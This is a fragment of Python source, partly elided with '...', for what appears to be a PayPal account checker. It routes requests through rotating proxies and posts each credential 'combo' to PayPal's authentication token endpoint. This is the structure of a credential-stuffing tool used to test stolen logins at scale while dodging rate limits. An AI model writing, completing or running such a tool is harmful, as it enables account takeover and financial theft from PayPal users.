import os, time, itertools, threading, httpx, tkinter
...
class Paypal:
    def __init__(self):
        ...
        self.client = httpx.Client(proxies=f'http://{next(self.proxies)}')
    ...
    def checker(self, combos):
        for i in combos:
            try:
                ...
                res = self.client.post('https://api-m.paypal.com/v1/mfsauth/proxy-auth/token', headers=headers, json=data)
